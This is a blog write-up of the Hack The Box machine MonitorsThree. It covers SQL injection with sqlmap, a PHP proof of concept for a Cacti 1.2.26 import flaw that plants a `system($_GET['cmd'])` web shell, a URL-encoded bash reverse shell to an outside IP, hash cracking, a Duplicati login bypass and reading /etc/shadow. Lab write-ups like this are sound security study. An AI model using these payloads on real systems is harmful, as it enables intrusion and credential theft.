---
layout: post
title: "MonitorsThree HTB writeup"
subtitle: "Walkethrough for the MonitorsThree HTB machine."
date: 2024-08-30 23:45:13
background: '/img/posts/04.jpg'

---

## Report
Doing the usual port scanning

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829190437.png" alt="1" style="width:700px; height:auto;">
<br/> 

We get the usual `22 ssh`, `80 http` but here we get a weird `8084` filtered port, we will put that for later.  
Checking port `80` we get a redirection 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829190607.png" alt="2" style="width:700px; height:auto;">
<br/> 
Adding it to `/etc/hosts`  
Having a domain, means that the machine can host another subdomain or a Vhost.  
Doing Vhost fuzzing using gobuster

```bash
gobuster vhost -u="http://monitorsthree.htb" -w=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

We get a hit  

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829190805.png" alt="3" style="width:700px; height:auto;">
<br/>
Added to the `/etc/hosts` file.  
Doing a directory fuzzing in the background while checking the website.

```bash
gobuster dir -u=http://monitorsthree.htb -w=/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x txt,php,zip,html,db
```

Index page got nothing interesting but a single button (going with low hanging fruits) and of course source code has nothing interesting.
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829190954.png" alt="4" style="width:700px; height:auto;">
<br/>
Checking the `login` button.
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829191036.png" alt="5" style="width:700px; height:auto;">
<br/>
Trying default credentials led to nothing.  
We have 2 interesting pages a `login` and a `forgot password`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829191121.png" alt="6" style="width:700px; height:auto;">
<br/>
Checking the directory fuzzing, we get nothing really special but `admin` that we can check later  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829191222.png" alt="7" style="width:700px; height:auto;">
<br/>
Firing up `burpsuite` to intercept the 2 requests and passing them to `sqlmap` to automate the job  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829191326.png" alt="8" style="width:700px; height:auto;">
<br/>
Opening `burpsuite`, get to the proxy tab and open the intercept  
his is the request of the `login`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829205757.png" alt="9" style="width:700px; height:auto;">
<br/>
And here is the request of the `forgot_password`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829205915.png" alt="10" style="width:700px; height:auto;">
<br/>
Copying them and saving them into 2 separates  files  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829205956.png" alt="11" style="width:700px; height:auto;">
<br/>
Passing them to `sqlmap` in parallels to automate and speed things up  

```bash
sqlmap -r reqLogin --batch --risk=3 --level=3
```

Same for the `reqRecover` 

```bash
sqlmap -r reqRecover --batch --risk=3 --level=3
```

Trying at that time to manually do some sql injection payloads to speed things up.  
Chose to begin with the `forgot_password` page.  
Testing for a lot of injection payloads we always get the same error  

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829210442.png" alt="12" style="width:700px; height:auto;">
<br/>

Till we get something strange trying this payload `'sd -- -`  

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829210746.png" alt="13" style="width:700px; height:auto;">
<br/>
Now we know how to inject new queries, by adding the prefix `' ` and the suffix `-- - `  but URL encoded of course from burspuite's repeater.  
Trying the famous `1=1` payload `tr'OR+1=1+--+-+`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829211007.png" alt="14" style="width:700px; height:auto;">
<br/>
Very weird...  
Trying to reveal the number of columns using the `order by` method `tr'+ORDER+BY+20+--+-+`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829211215.png" alt="15" style="width:700px; height:auto;">
<br/>

Trying to go lower till we reach this `tr'+ORDER+BY+9+--+-+` 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829211558.png" alt="16" style="width:700px; height:auto;">
<br/>

Seems that this payload worked but it actually doesn't display anything.  
From this we can conclude that this is a blind  error based or time based SQL injection with a prefix of `'` and a suffix of `-- -` and the vulnerable page is the `forgot_password` page.  
Knowing that we can proceed with `sqlmap`, stop the 2 processes and give `sqlmap` some hints to speed things up a little bit 

```bash
sqlmap -r req2  --batch --prefix="'" --suffix="-- -" --dbs  --technique=BEU
```

And we get a hitt!! we discover the database `monitorsthree_db` and ending up (after very very long time due to poor connection) extracting those findings.

<br/> 
<img src="/img/MonitorsThreeScreenshots/Screenshot_2.png" alt="17" style="width:700px; height:auto;">
<br/>

Cracking the hash and we end up with the credentials `admin:greencacti2001`  
Trying to login with those credentials to our admin panel 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829213035.png" alt="18" style="width:700px; height:auto;">
<br/>
We logged in as admin but it led us to nowhere.  
Time to check for our other Vhost `cacti`  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240829213348.png" alt="19" style="width:700px; height:auto;">
<br/>

`cacti` application found with a version `1.2.26`  
A small search, a vulnerability was found this [link](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) explains the exploitation  
Using this exploit here

```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php phpinfo(); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

Changing the `filedata` variable to be  

```php
<?php system(\$_GET['cmd']); ?>
```

Run the POC 

```bash
php poc.php
```

A zip file was generated
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830173621.png" alt="20" style="width:700px; height:auto;">
<br/>
Logging in to the cacti dashboard using the same credentials
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830173857.png" alt="21" style="width:700px; height:auto;">
<br/>
Following the POC, going to `Import/Export` > `Import Package` 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830174007.png" alt="22" style="width:700px; height:auto;">
<br/>
Select the `test.xml.gz` file and import it 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830174106.png" alt="23" style="width:700px; height:auto;">
<br/>
Follow the path given `/var/www/html/cacti/resource/test.php`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830184430.png" alt="24" style="width:700px; height:auto;">
<br/>
We get RCE  
Using the `revshells.com` payload and URL encode it, open a NC listener, we get a connection

```
http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.66%2F4444%200%3E%261%27
```

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830184620.png" alt="25" style="width:700px; height:auto;">
<br/>
Upgrading the shell 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830184728.png" alt="26" style="width:700px; height:auto;">
<br/>
Searching for Database credentials, we get a hit `/var/www/html/cacti/lib/installer.php` using `linpeas.sh`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830192445.png" alt="27" style="width:700px; height:auto;">
<br/>
Logging in with those credentials 

```bash
www-data@monitorsthree:~/html/cacti$ mysql -u cactiuser -pcactiuser
```

Issuing the command `show databases;`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830192746.png" alt="28" style="width:700px; height:auto;">
<br/>
Then `use cacti;` and issuing `show tables;`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830192853.png" alt="29" style="width:700px; height:auto;">
<br/>
We can see an interesting table `user_auth`  
Issuing the command `SELECT * FROM user_auth;`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830193723.png" alt="30" style="width:700px; height:auto;">
<br/>
Found the password hash of the user `marcus` which we disclosed being a user on the machine with the `cat /etc/passwd` command 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830193858.png" alt="31" style="width:700px; height:auto;">
<br/>
Cracking the hash using `hashcat` we get the password in clear text
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830193957.png" alt="32" style="width:700px; height:auto;">
<br/>
As SSH was open, we try to SSH but we get a public key error 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830194030.png" alt="33" style="width:700px; height:auto;">
<br/>
This error mean that the machine does not support logging in using `username:password`  
Logging in within our reverse shell and grabbing the private ssh key of the marcus user
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830201311.png" alt="34" style="width:700px; height:auto;">
<br/>
Copying the key and ssh using the key from our local machine  
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830201419.png" alt="35" style="width:700px; height:auto;">
<br/>
The machine has a docker container 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830201500.png" alt="36" style="width:700px; height:auto;">
<br/>
This explains the `filtered` port we found on the port scanning step  
Looking at the internal open ports
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830202736.png" alt="37" style="width:700px; height:auto;">
<br/>
The high ports are more signs of a docker running.  
Performing Local Port Forwarding using ssh 

```bash
ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i id_rsa
```

Checking the new service running on `localhost:8200`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830203913.png" alt="38" style="width:700px; height:auto;">
<br/>
`Duplicati` service found running. A famous service for backup and storage solution.  
A quick search, a vulnerability was found [here](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)

Following the explanation, we can find the database files
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830204444.png" alt="39" style="width:700px; height:auto;">
<br/>
Downloading the files to our local machine and analyzing them, checking the `Duplicati-server.sqlite` database 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830210326.png" alt="40" style="width:700px; height:auto;">
<br/>
Checking the `Option` tables
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830210413.png" alt="41" style="width:700px; height:auto;">
<br/>
We found the `server-passphrase` the blog was referencing to.  
Getting to the `duplicati` platform, we give an arbitrary value for the password and intercept the request with `burpsuite`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830210648.png" alt="42" style="width:700px; height:auto;">
<br/>
Writing down the `session-nonce` then open the console from the `inspect`
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830211321.png" alt="43" style="width:700px; height:auto;">
<br/>
Writing down the payload 
```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```
The `saltedpwd` is the `server-passphrase` but decoding it from `base64` and then applying `HEX` encoding
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830212020.png" alt="44" style="width:700px; height:auto;">
<br/>
Applying the payload, we get a `base64` password 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830212201.png" alt="45" style="width:700px; height:auto;">
<br/>
Do not forget to URL decode the `nonce` taken from the request.  
Paste the password into the `password` field and URL encode it. Forward the request 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830214340.png" alt="46" style="width:700px; height:auto;">
<br/>
We bypassed the login page and authenticated  
Now to be able to escalate privileges, and read the root files, we can do the following

1. Add a new backup and configure a new backup

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830214712.png" alt="47" style="width:700px; height:auto;">
<br/>

2. Give it a name and remove encryption

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830214802.png" alt="48" style="width:700px; height:auto;">
<br/>

3.  make the destination to be `/source/tmp` as the local device is mounted in the `source` folder in this docker image 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215015.png" alt="49" style="width:700px; height:auto;">
<br/>

4. For the source data add the `/source/etc/shadow` to the path and select it 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215204.png" alt="50" style="width:700px; height:auto;">
<br/>

5. Remove the auto backup 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215422.png" alt="51" style="width:700px; height:auto;">
<br/>

6. save it

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215433.png" alt="52" style="width:700px; height:auto;">
<br/>

7. Run the backup then click on restore and select the backup just created 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215605.png" alt="53" style="width:700px; height:auto;">
<br/>

8. Select the target file `Shadow` 

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215709.png" alt="54" style="width:700px; height:auto;">
<br/>

9. Chose the target path to restore it to, here `/source/tmp`

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215751.png" alt="55" style="width:700px; height:auto;">
<br/>

10. Restore it and check the `/tmp/shadow` file

<br/> 
<img src="/img/MonitorsThreeScreenshots/Pasted image 20240830215828.png" alt="56" style="width:700px; height:auto;">
<br/>

The machine was pawned successfully 
<br/> 
<img src="/img/MonitorsThreeScreenshots/Screenshot_4.png" alt="57" style="width:700px; height:auto;">
<br/>
